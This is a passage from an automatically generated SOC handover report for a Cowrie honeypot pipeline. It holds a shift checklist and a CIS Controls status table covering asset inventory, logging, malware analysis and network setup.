- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-15T22:27:32Z_
